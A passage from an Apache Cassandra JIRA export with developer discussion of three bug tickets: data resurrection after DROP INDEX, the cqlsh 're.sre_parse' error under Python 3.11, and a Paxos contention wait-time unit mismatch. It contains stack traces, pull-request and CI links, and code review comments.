It is also worth to mention that this is not happening without restarting the node because upon restart, the commit log is replayed and it will look into this table to see if a table was truncated so it will not replay the mutations. However, since there is no such record in that truncated_at map for that table anymore as DROP INDEX removed it, it will just replay it all so data will resurrect.

 

 

(1) [https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/db/ColumnFamilyStore.java#L695]
(2) [https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/index/internal/CassandraIndex.java#L739];;;","19/Apr/23 18:01;maedhroz;Good find. I think this confirms that SAI wouldn't have been affected.

Let me know if you need a reviewer.;;;","20/Apr/23 09:12;smiklosovic;[~maedhroz]  would you mind to take a look at this?

[https://github.com/apache/cassandra/pull/2286/files]

I expect the patch to be exactly same for all branches. I just do not want to make all of them and starting to build it if you expect the changes be somehow different. I ll provide it all once reviewed.;;;","20/Apr/23 09:23;maxwellguo;+1 on this path, and left one comment.(y) Thanks [~smiklosovic];;;","21/Apr/23 03:50;maedhroz;I'll take look tomorrow.;;;","21/Apr/23 18:34;maedhroz;LGTM, w/ a couple small nits left inline.

Just let me know when the other branches are up...;;;","24/Apr/23 09:41;smiklosovic;PRs

3.0 [https://github.com/apache/cassandra/pull/2286]
3.11 [https://github.com/apache/cassandra/pull/2289]
4.0 [https://github.com/apache/cassandra/pull/2290]
4.1 [https://github.com/apache/cassandra/pull/2291]
trunk [https://github.com/apache/cassandra/pull/2292]

Tests are more or less same as suggested on the PR for 3.0, however, for 3.11, I noticed that there is a bug for materialized view. I left out that MV test.

The error for MV test in 3.11 branch is that it is not possible to drop a materialized view (yeah, really). It will be visible if one takes the test in 3.0 patch and tries it in 3.11 branch. It will end up throwing this:

This is thrown really just for 3.11 branch. 4.0+ branches are not affected. Nor 3.0 is. Just 3.11.

Since this patch is dealing with indices primarily and it has nothing to do with MVs as such, I do not think that spending more time on fixing this bug is necessary.

{code}
Caused by: java.util.concurrent.ExecutionException: org.apache.cassandra.db.KeyspaceNotDefinedException: Keyspace system_distributed does not exist
	at java.util.concurrent.FutureTask.report(FutureTask.java:122)
	at java.util.concurrent.FutureTask.get(FutureTask.java:192)
	at org.apache.cassandra.utils.FBUtilities.waitOnFuture(FBUtilities.java:438)
	... 11 more
Caused by: org.apache.cassandra.db.KeyspaceNotDefinedException: Keyspace system_distributed does not exist
	at org.apache.cassandra.thrift.ThriftValidation.validateKeyspace(ThriftValidation.java:85)
	at org.apache.cassandra.thrift.ThriftValidation.validateColumnFamilyWithCompactMode(ThriftValidation.java:114)
	at org.apache.cassandra.cql3.statements.ModificationStatement$Parsed.prepare(ModificationStatement.java:822)
	at org.apache.cassandra.cql3.statements.ModificationStatement$Parsed.prepare(ModificationStatement.java:816)
	at org.apache.cassandra.cql3.QueryProcessor.getStatement(QueryProcessor.java:680)
	at org.apache.cassandra.cql3.QueryProcessor.parseStatement(QueryProcessor.java:279)
	at org.apache.cassandra.cql3.QueryProcessor.prepareInternal(QueryProcessor.java:324)
	at org.apache.cassandra.cql3.QueryProcessor.executeInternal(QueryProcessor.java:332)
	at org.apache.cassandra.repair.SystemDistributedKeyspace.setViewRemoved(SystemDistributedKeyspace.java:307)
	at org.apache.cassandra.db.view.ViewManager.removeView(ViewManager.java:175)
	at org.apache.cassandra.db.view.ViewManager.reload(ViewManager.java:119)
	at org.apache.cassandra.config.Schema.dropView(Schema.java:772)
	at org.apache.cassandra.schema.SchemaKeyspace.lambda$updateKeyspace$23(SchemaKeyspace.java:1480)
	at java.util.HashMap$Values.forEach(HashMap.java:982)
	at java.util.Collections$UnmodifiableCollection.forEach(Collections.java:1082)
	at org.apache.cassandra.schema.SchemaKeyspace.updateKeyspace(SchemaKeyspace.java:1480)
	at org.apache.cassandra.schema.SchemaKeyspace.mergeSchema(SchemaKeyspace.java:1451)
	at org.apache.cassandra.schema.SchemaKeyspace.mergeSchema(SchemaKeyspace.java:1413)
	at org.apache.cassandra.schema.SchemaKeyspace.mergeSchemaAndAnnounceVersion(SchemaKeyspace.java:1390)
	at org.apache.cassandra.service.MigrationManager$1.runMayThrow(MigrationManager.java:464)
	at org.apache.cassandra.utils.WrappedRunnable.run(WrappedRunnable.java:28)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
{code};;;","24/Apr/23 14:23;smiklosovic;I run the multiplexer but I am not able to run it successfully. It throws this:

https://app.circleci.com/pipelines/github/instaclustr/cassandra/2118/workflows/1c5658d4-250e-4e5f-aedc-ad80c0127bde/jobs/24768/tests#failed-test-0

{code}
org.apache.cassandra.distributed.shared.ShutdownException: Uncaught exceptions were thrown during test
	at org.apache.cassandra.distributed.impl.AbstractCluster.checkAndResetUncaughtExceptions(AbstractCluster.java:748)
	at org.apache.cassandra.distributed.impl.AbstractCluster.close(AbstractCluster.java:734)
	at org.apache.cassandra.distributed.test.IndexAndMVDroppingTest.shutdown(IndexAndMVDroppingTest.java:65)
	Suppressed: java.lang.RuntimeException: java.util.concurrent.ExecutionException: org.apache.cassandra.db.compaction.CompactionInterruptedException: Compaction interrupted: Secondary index build@5bb59060-e29a-11ed-bded-33234da21547(distributed_test_keyspace, tb1, 8/8)bytes
		at org.apache.cassandra.utils.FBUtilities.waitOnFuture(FBUtilities.java:442)
		at org.apache.cassandra.index.internal.CassandraIndex.buildBlocking(CassandraIndex.java:731)
		at org.apache.cassandra.index.internal.CassandraIndex.lambda$getBuildIndexTask$5(CassandraIndex.java:701)
		at java.util.concurrent.FutureTask.run(FutureTask.java:266)
		at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
		at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
		at org.apache.cassandra.concurrent.NamedThreadFactory.lambda$threadLocalDeallocator$0(NamedThreadFactory.java:84)
		at java.lang.Thread.run(Thread.java:750)
	Caused by: java.util.concurrent.ExecutionException: org.apache.cassandra.db.compaction.CompactionInterruptedException: Compaction interrupted: Secondary index build@5bb59060-e29a-11ed-bded-33234da21547(distributed_test_keyspace, tb1, 8/8)bytes
		at java.util.concurrent.FutureTask.report(FutureTask.java:122)
		at java.util.concurrent.FutureTask.get(FutureTask.java:192)
		at org.apache.cassandra.utils.FBUtilities.waitOnFuture(FBUtilities.java:438)
	Caused by: org.apache.cassandra.db.compaction.CompactionInterruptedException: Compaction interrupted: Secondary index build@5bb59060-e29a-11ed-bded-33234da21547(distributed_test_keyspace, tb1, 8/8)bytes
		at org.apache.cassandra.index.internal.CollatedViewIndexBuilder.build(CollatedViewIndexBuilder.java:69)
		at org.apache.cassandra.db.compaction.CompactionManager$14.run(CompactionManager.java:1744)
		at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
{code}

I am not completely sure why this is happening. I tried to disable automatic compaction but it throws it like 3 times out of 500.

3.11 PR is here https://github.com/apache/cassandra/pull/2289

In general, I have quite bad feeling about 3.11 branch. I can try this on 4.0 to see if it happens there too. ;;;","24/Apr/23 16:39;maedhroz;[~smiklosovic] It looks like that's just the initial index build (which runs via {{CompactionManager}}), not a ""real"" compaction. I think we could avoid this by waiting for the initial index build to complete (in addition to avoiding auto-compaction). In 3.0, the closest thing we have to doing this is probably {{CQLTester#waitForIndex()}}. Let me know if you want to talk about that further.;;;","24/Apr/23 16:44;maedhroz;{{CassandraIndexTest.TestScript}} also does this.;;;","24/Apr/23 16:58;maedhroz;I'm also fine w/ side-stepping the MV issue for now and leaving that test out of the patch, btw;;;","25/Apr/23 14:07;smiklosovic;Thanks, that helped.

3.0 https://github.com/apache/cassandra/pull/2286
3.11 https://github.com/apache/cassandra/pull/2289
4.0 https://github.com/apache/cassandra/pull/2290
4.1 https://github.com/apache/cassandra/pull/2291
trunk https://github.com/apache/cassandra/pull/2292

builds:

3.0 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2129/workflows/1252eca4-bbdd-426f-87b0-a93fbbc38723
3.11 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2130/workflows/4c174ddb-23bd-4a3e-b57a-9a72b52b2245
4.0 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2131/workflows/d0753f31-82b7-4986-a4d3-f082cbe45047
4.1 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2132/workflows/c09cdd14-0f6b-40a0-a88b-aed766a88e4b
trunk https://app.circleci.com/pipelines/github/instaclustr/cassandra/2133/workflows/6215ee32-7e4c-40e2-8363-ca1069395cc0

I am running multiplexer like 1000x and it seem to be stable.

When one looks closer into what tests are failing for 3.0 / 3.11, they are unrelated and they have something in common with 

{code}
>       configured_strategy = CONFIG.getoption(""--upgrade-version-selection"").upper()
E       AttributeError: 'NoneType' object has no attribute 'getoption'
{code}

This is out of scope of this ticket. I think that these tests are using some old way of doing things and it backfired here.;;;","25/Apr/23 17:04;maedhroz;Approved all the PRs. Glad the index wait seems to have stabilized things.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
cqlsh - module 're' has no attribute 'sre_parse' - with Python 3.11,CASSANDRA-18088,13509774,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,aploetz,aploetz,04/Dec/22 17:43,20/May/23 18:25,13/Jul/23 08:40,20/Jan/23 21:31,4.0.8,4.1.1,5.0,,,,CQL/Interpreter,,,,0,,"User reported an error with cqlsh (Cassandra 4.0.7) on Stack Overflow: [https://stackoverflow.com/questions/74673247/cannot-able-to-run-cqlsh-due-to-python-attribute-error|https://stackoverflow.com/questions/74673247/cannot-able-to-run-cqlsh-due-to-python-attribute-error?noredirect=1#comment131807816_74673247]

 

Found out that the user was using Python 3.11, and I was able to reproduce it with that.

{{% python3.11 bin/cqlsh.py}}
{{Traceback (most recent call last):}}
{{  File ""/Users/aaronploetz/local/apache-cassandra-4.0.7/bin/cqlsh.py"", line 159, in <module>}}
{{    from cqlshlib import cql3handling, cqlhandling, pylexotron, sslhandling, cqlshhandling}}
{{  File ""/Users/aaronploetz/local/apache-cassandra-4.0.7/bin/../pylib/cqlshlib/cql3handling.py"", line 19, in <module>}}
{{    from cqlshlib.cqlhandling import CqlParsingRuleSet, Hint}}
{{  File ""/Users/aaronploetz/local/apache-cassandra-4.0.7/bin/../pylib/cqlshlib/cqlhandling.py"", line 23, in <module>}}
{{    from cqlshlib import pylexotron, util}}
{{  File ""/Users/aaronploetz/local/apache-cassandra-4.0.7/bin/../pylib/cqlshlib/pylexotron.py"", line 342, in <module>}}
{{    class ParsingRuleSet:}}
{{  File ""/Users/aaronploetz/local/apache-cassandra-4.0.7/bin/../pylib/cqlshlib/pylexotron.py"", line 343, in ParsingRuleSet}}
{{    RuleSpecScanner = SaferScanner([}}
{{                      ^^^^^^^^^^^^^^}}
{{  File ""/Users/aaronploetz/local/apache-cassandra-4.0.7/bin/../pylib/cqlshlib/saferscanner.py"", line 91, in _{_}init{_}_}}
{{    s = re.sre_parse.State()}}
{{        ^^^^^^^^^^^^}}

{{AttributeError: module 're' has no attribute 'sre_parse'}}

Appears to be something specific (again) with Python's synchronizing regex engine (SRE).  Works fine with Python 3.10, so there may have been a(nother) breaking change in that the re module with 3.11.",,aploetz,bereng,brandon.williams,bschoeni,e.dimitrova,jeffwidman,mck,paulo,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-18094,CASSANDRA-18121,,,,,,,,,"20/May/23 18:25;godwin;saferscanner.py;https://issues.apache.org/jira/secure/attachment/13058386/saferscanner.py",,,,,1.0,brandon.williams,,,,,,,,,,,,,,Code,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Mar 22 04:07:14 UTC 2023,,,,,,,All,,,,"0|z1ddww:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/0b5248d8c3ef743a8dda42f7be5dadb70e373b51,,,,,,,,,run CI,,,,,"04/Dec/22 19:06;brandon.williams;Looks like sre was [moved around|https://github.com/python/cpython/pull/32177/commits/ef52a1326dba8f9becadca052cb0db49b440f10a] so we need to do something like [this|https://github.com/driftx/cassandra/commit/c2c72025c6f5e09dfbee14e1d1b34a6d745a496c].;;;","06/Dec/22 19:06;brandon.williams;||Branch||Circle||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-18088-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/716/workflows/ec1d8bd6-8e8d-4433-a7be-19a0973d3c77], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/716/workflows/6f420576-cdb8-4dcd-8ba9-76b92093db52]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-18088-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/715/workflows/301a8e1b-0f3c-430a-9d51-eb421e99faf4], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/715/workflows/0c5afcb7-5a44-4e3b-a3b9-80284f44b6ad]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-18088-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/717/workflows/2139e59d-72cc-4983-b76a-ba4ed131f631], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/717/workflows/b5b7f158-1dab-4d00-9454-223b8800e76f]|;;;","07/Dec/22 09:27;bereng;[~brandon.williams] both this and 18094 make sense to me. But do we have a CI run where we see the tests being ran under the new image and 3.11 venv? If my eyes aren't fooling me I don't see it. We would need new jenkins and circle jobs. We have '_3' and '_38' jobs, we'd need new '_311' jobs? Am I misunderstanding sthg?;;;","07/Dec/22 11:17;brandon.williams;I don't think you are missing anything, but maybe I am.

bq. We have '_3' and '_38' jobs, we'd need new '_311' jobs

This sounds like a reasonable thing, but where are these '_3' and '_38' jobs?;;;","07/Dec/22 13:53;bereng;On circle we have [this|https://app.circleci.com/pipelines/github/driftx/cassandra/716/workflows/ec1d8bd6-8e8d-4433-a7be-19a0973d3c77/jobs/8209] i.e. and then again the variant for '_38' ;;;","07/Dec/22 14:34;brandon.williams;I'm unable to locate any kind of jenkins equivalent, are you aware of any?  I will add the _py311 circle configs to CASSANDRA-18094.;;;","07/Dec/22 16:20;brandon.williams;There is not yet equivalency in Jenkins: CASSANDRA-18101;;;","09/Dec/22 08:55;bereng;Yeah you're right, jenkins is missing them as well.;;;","14/Dec/22 15:02;brandon.williams;Here I am killing two birds with one stone: CI under python 3.11 for the sre module changes from this ticket, and testing of the docker image with python 3.11 that we will push for all of CI, if this goes well.

This incorporates all the circle changes from CASSANDRA-18094 and uses the docker image from my repo.

||Branch||CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-18088-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/733/workflows/42d4c66b-a105-42b8-9a4e-b3649d239b25], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/733/workflows/a2b6f194-d410-4947-a9a5-14e44ef770d4]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-18088-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/735/workflows/4afba4f7-80b9-4028-b2db-3a90f7d8a685], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/735/workflows/c48ca2be-883b-4e80-be64-34c6ceab0790]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-18088-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/734/workflows/0d5aa254-a6f0-4d63-a76e-d6323bddf024], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/734/workflows/30186daf-5b3a-4cde-8f9f-94f2d35c0360]|

and here's a smoke test in jenkins of the docker image:
[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/2104/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/2104/pipeline]

;;;","14/Dec/22 15:55;brandon.williams;There's some kind of problem with the 3.11 env I'll have to sort out, but at least we know the image didn't break anything existing.;;;","14/Dec/22 16:18;bereng;Weird seems like the new image didn't make it through... In any case I think we chose the right CI strategy for both these tickets;;;","15/Dec/22 17:52;brandon.williams;In the image with dependencies I didn't update the source, so it was still built from the apache repo.  I've corrected that and uploaded the new image.

There's another problem, though.  Circle runs 'cqlsh_dtests' with the dtest runner and the [regex flag with 'cql'|https://github.com/apache/cassandra/blob/trunk/.circleci/config-2_1.yml#L2160] passed to it, which effectively means that cqlsh and the dtest repo must move in lockstep with regard to the python version.  If 3.11 support is added to cqlsh, because of this, it has to be added to the dtests as well.

I looked into updating the dtests and that is going to be significant work worthy of its own ticket (to begin with, pytest has to be updated.)  I think we should not block having cqlsh work based upon what will work with the dtests, and instead make circle work more like Jenkins does to run the cqlsh tests.;;;","15/Dec/22 18:14;brandon.williams;There is too much functionality being tested in the dtests' cqlsh_tests to easily divorce them and cqlsh from the same python versions supported.  I've created CASSANDRA-18121 for the dtests and will go back to looking into them.;;;","16/Dec/22 06:14;bereng;Are you saying you A. are going to make dtests repo 3.11 'friendly' or B. that we will add new dtests runs for 3.11? I guess you mean B yes?;;;","16/Dec/22 11:50;brandon.williams;Unfortunately, no, we need A: make the dtests work under 3.11.;;;","16/Dec/22 17:34;brandon.williams;And yet another wrinkle: the cqlshlib tests use nose, and nose is more or less dead and doesn't support 3.11 either, so that has to be migrated to pytest.;;;","16/Dec/22 19:44;smiklosovic;btw there is also CASSANDRA-17861;;;","16/Dec/22 20:44;brandon.williams;Thanks.  CCM appears to be the one part of our python ecosystem this ticket doesn't need to reach into.  So far.


;;;","18/Jan/23 11:57;brandon.williams;Here goes another attempt.  This incorporates all the circle changes from CASSANDRA-18094, has extra fixes on top of that, uses the docker image from my repo, and runs against CASSANDRA-18121 dtests.

||Branch||CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-18088-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/784/workflows/2f68ddcb-32df-4079-80a9-562afffc4204], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/784/workflows/91a6b93b-91d1-4917-845d-635c2b6b1585]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-18088-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/785/workflows/f0beb2f8-690a-49de-a138-8c06049f5954], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/785/workflows/aa585189-d952-4548-8c7e-a241f9dc62b7]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-18088-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/786/workflows/81f67a32-d0c8-40a6-b529-09f662e0931f], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/786/workflows/d4868597-594f-4c7d-bfc0-1ac97b228750]|;;;","18/Jan/23 16:59;brandon.williams;These trunk failures are surprising, but reproduce so I'm investigating.

edit: things look better after rebasing the dtests, I've edited the CI links above.;;;","19/Jan/23 06:40;bereng;All looks good to me. I am only worried about all those feature branches being well behind, like 70 commits or so, hence I would recommend a rebase throughout everything so we don't merge and immediately fail sthg. It shouldn't as we're only touching a reasonably isolated part of the code but I'd still be on the safe side. +1 when everything passes after the rebase.

I noticed the 4.0 PR fixes some tests that are not touched on 4.1 and trunk. Everything passes but is that correct?;;;","19/Jan/23 12:52;brandon.williams;I'll rebase these and put up a new matrix.

bq. I noticed the 4.0 PR fixes some tests that are not touched on 4.1 and trunk

You are probably talking about [this commit|https://github.com/driftx/cassandra/commit/a131c48d32bf9c033dc4e5b46a2f9ae2b32d5311] which exists because CASSANDRA-17293 didn't go into 4.0, and now it needs it.;;;","19/Jan/23 13:17;bereng;Sorry I misled you. I actually meant in 4.0 cassconnect.py, tes_sslhandling, pytest.ini and requirements.txt are touched where they aren't on 4.1 and trunk?;;;","19/Jan/23 13:26;brandon.williams;Can you point at the commit so I know we are on the same page?;;;","19/Jan/23 14:15;bereng;You can see it here for [4.0|https://github.com/apache/cassandra/compare/cassandra-4.0...driftx:cassandra:CASSANDRA-18088-4.0] and here for [4.1|https://github.com/apache/cassandra/compare/cassandra-4.1...driftx:cassandra:CASSANDRA-18088-4.1] i.e.;;;","19/Jan/23 15:14;brandon.williams;I'm unable find to any commits that touch those files that aren't the one I referenced above.;;;","19/Jan/23 18:10;brandon.williams;Rebased:

||Branch||CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-18088-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/790/workflows/3ef175b4-e9e4-4f76-a7c0-3f644167e136], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/790/workflows/a2632a1d-34af-48c8-86bb-00b1260c4758]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-18088-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/792/workflows/eb5953ed-394a-4859-9711-a997b4e4b1bb], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/792/workflows/53c70963-1df2-4e77-bfb9-23c1275fc246]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-18088-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/791/workflows/4f1a4808-ec76-4b87-88d7-21db6a0217a0], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/791/workflows/daf3256a-b9ad-4db0-bf52-42b4c3567b0a]|;;;","20/Jan/23 05:43;bereng;Thx for the explanation, makes sense now. +1 across circle, docker, pytests,... release the Kraken!;;;","20/Jan/23 11:57;brandon.williams;Thanks for the review!  We need to begin committing this by first updating the docker images.  [~edimitrova] and [~mck], I believe you have access to do this, can you assist?;;;","20/Jan/23 14:23;e.dimitrova;Sure, but I think [~mck] is already on it based on ASF Slack chat I saw. Still, let me know if you need me for anything. Happy to help;;;","20/Jan/23 17:30;mck;Docker images are getting published…;;;","20/Jan/23 21:31;brandon.williams;Committed, thanks everyone!;;;","21/Mar/23 22:43;bschoeni;[~brandon.williams]  I noticed the 4.1.x and trunk commits here appear to have re-introduced 'six' and obsolete python 2.7 conditional checks.  I.e., SaferScanner = Py36SaferScanner if six.PY3 else Py2SaferScanner – but there is no Py2SaferScanner anymore.;;;","21/Mar/23 22:49;brandon.williams;You are right [~bschoeni], can you open a new ticket to remove those?;;;","21/Mar/23 23:16;bschoeni;[~brandon.williams] sure, see https://issues.apache.org/jira/browse/CASSANDRA-18354;;;","22/Mar/23 04:07;jeffwidman;Good call [~bschoeni] I came here to report this exact issue! :D;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Bug fix for 'wait' time to be in nanoseconds for consistency instead of microseconds,CASSANDRA-18086,13509233,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,marianne-manaog,marianne-manaog,marianne-manaog,02/Dec/22 12:37,17/Jan/23 10:21,13/Jul/23 08:40,07/Dec/22 20:27,4.1.0,,,,,,Feature/Lightweight Transactions,,,,0,,"While working on benchmarking Paxos improvements in OSS Cassandra, [~benedict] was asked to review the work and thus found that the wait time was input in microseconds but then output incorrectly in the ContentionStrategy.java file, i.e., by summing up a wait time in nanoseconds with another wait time in microseconds (two different units used mistakenly). So, Benedict suggested the fix whereby the output wait time was then enforced to be consistently in nanoseconds.",,aweisberg,bdeggleston,benedict,brandon.williams,dcapwell,e.dimitrova,jmckenzie,marianne-manaog,mck,mfleming,mmuzaf,smiklosovic,,,"marianne-manaog opened a new pull request, #2038:
URL: https://github.com/apache/cassandra/pull/2038

   A bug fix for 'wait' time to be in nanoseconds for consistency instead of microseconds.
   
   patch by @marianne-manaog, although fix suggested by @belliottsmith;
   
   The [Cassandra Jira](https://issues.apache.org/jira/browse/CASSANDRA-18086)


;02/Dec/22 12:45;githubbot;600","aweisberg commented on code in PR #2038:
URL: https://github.com/apache/cassandra/pull/2038#discussion_r1039952328


##########
src/java/org/apache/cassandra/service/paxos/ContentionStrategy.java:
##########
@@ -409,7 +409,7 @@ private long computeWaitUntilForContention(int attempts, TableMetadata table, De
         }
 
         long wait = waitRandomizer.wait(minWaitMicros, maxWaitMicros, attempts);

Review Comment:
   ```suggestion
           long waitMicros = waitRandomizer.wait(minWaitMicros, maxWaitMicros, attempts);
   ```



;05/Dec/22 19:02;githubbot;600","belliottsmith commented on PR #2038:
URL: https://github.com/apache/cassandra/pull/2038#issuecomment-1340719493

   Yes, we could definitely convert to nanos earlier and always use nanos. Perhaps we can do that in a follow-up patch.


;07/Dec/22 10:26;githubbot;600","belliottsmith commented on PR #2038:
URL: https://github.com/apache/cassandra/pull/2038#issuecomment-1340721435

   Marianne, I think you intended to merge the 18097 PR in here, but it seems to have merged ""cleanly"" meaning none of the commits were adopted. Not sure what happened there.


;07/Dec/22 10:27;githubbot;600","marianne-manaog commented on PR #2038:
URL: https://github.com/apache/cassandra/pull/2038#issuecomment-1340816358

   Thanks for your comment, @belliottsmith. I have updated this branch and PR to reflect all related changes required for review.
   
   > Marianne, I think you intended to merge the 18097 PR in here, but it seems to have merged ""cleanly"" meaning none of the commits were adopted. Not sure what happened there.
   
   


;07/Dec/22 11:14;githubbot;600","marianne-manaog commented on PR #2038:
URL: https://github.com/apache/cassandra/pull/2038#issuecomment-1340893842

   Thanks for your comment, @aweisberg. @mfleming kindly added the required tests in [this commit](8ec9d77de6492189fdce92d4b09e9104c6626fae).
   
   > Can you add a unit test to `ContentionStrategyTest` that checks that `computeWaitUntilForContention` is producing values in the range we want?
   > 
   > A better fix is probably to only use microseconds in configuration where it makes expressing the configuration easier and convert to nanoseconds immediately upon reading the configuration. @belliottsmith WDYT?
   > 
   > At a higher level a [`Duration`](https://github.com/airlift/units/blob/c25cb5704978c48f8ce966d0c06447e351cab609/src/main/java/io/airlift/units/Duration.java) would be safer. It works as both a return value and a parameter unlike `TimeUnit` which doesn't pair well with a value.
   > 
   > Or we can keep going with somewhat ambiguous types and just be careful about naming and converting things to nanoseconds as soon as possible.
   
   


;07/Dec/22 12:25;githubbot;600","aweisberg commented on PR #2038:
URL: https://github.com/apache/cassandra/pull/2038#issuecomment-1344622625

   Committed as [f0ad7eadbeb3208e08a9339881931222fdab253b](https://github.com/apache/cassandra/commit/f0ad7eadbeb3208e08a9339881931222fdab253b)


;09/Dec/22 18:23;githubbot;600","aweisberg closed pull request #2038: CASSANDRA-18086: Fix wait time returned to be in nanoseconds
URL: https://github.com/apache/cassandra/pull/2038


;09/Dec/22 18:23;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4800,,,0,4800,,,,,,,,,,,,,,,CASSANDRA-17164,,,,,,CASSANDRA-18097,,,,,,,,,,,,,CASSANDRA-18097,,,,,,,,,,,,,0.0,marianne-manaog,,,,,,,,,,,,,,Degradation -> Performance Bug/Regression,,,,,,,,Normal,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Jan 17 10:21:19 UTC 2023,,,mfleming,,,,All,,,,"0|z1dakw:",9223372036854775807,,,,aweisberg,bdeggleston,benedict,jmckenzie,Normal,,4.1,,https://github.com/apache/cassandra/pull/2038,,,,,,,,,Add unit test to `ContentionStrategyTest.java` to check that the calculated wait is as expected.,,,,,"02/Dec/22 12:46;marianne-manaog;Hi [~benedict], I added [this PR|https://github.com/apache/cassandra/pull/2038] for the required bug fix you suggested; could you please review it? Thanks ;;;","05/Dec/22 21:21;jmckenzie;The patch LGTM. I have some slight concerns with {{ContentionStrategy.java}} as I read through it to convince myself this patch is correct; there's little to no documentation about the expectation of units being passed into various functions nor annotation around the unit being passed back out. I also have the luxury of having another implementation of this to compare the upstreamed to; the original did indeed have a slightly different approach to calculating wait that made it clear the intent there:
{code:java}
long wait = MICROSECONDS.toNanos(ThreadLocalRandom.current().nextLong(minWaitMicros, maxWaitMicros)); {code}
 

In this case, while simple inspection of the code after the fact of observing the regression shows probable unit mismatch:
{code:java}
        long minWaitMicros = min.get(attempts);
        long maxWaitMicros = max.get(attempts);
        long minDeltaMicros = minDelta.get(attempts);

        if (minWaitMicros + minDeltaMicros > maxWaitMicros)
        {
            maxWaitMicros = minWaitMicros + minDeltaMicros;
            if (maxWaitMicros > this.max.max)
            {
                maxWaitMicros = this.max.max;
                minWaitMicros = max(this.min.min, min(this.min.max, maxWaitMicros - minDeltaMicros));
            }
        }

        // REVIEW EDIT: micros go in, have to assume micros come back out?
        long wait = waitRandomizer.wait(minWaitMicros, maxWaitMicros, attempts);
        return nanoTime() + wait;
    }
{code}
My broad concern is that the lack of annotation about expected units of time for any of the {{WaitInterface}} implementers in the class as well as other supporting methods leave ambiguity that _theoretically_ encourages this class of error.

Now, that said, many (most? all?) of these supporting functions are actually time unit agnostic so could be used for both nano and microsecond precision units, so there's an argument here to not clutter the interface and implementation of things w/names or comments that bind us to a certain unit of operation. If we back out to the primary user of this in {{Paxos.cas()}} we can see that the primary proposeDeadline and commitDeadline are in nanos and extrapolate.

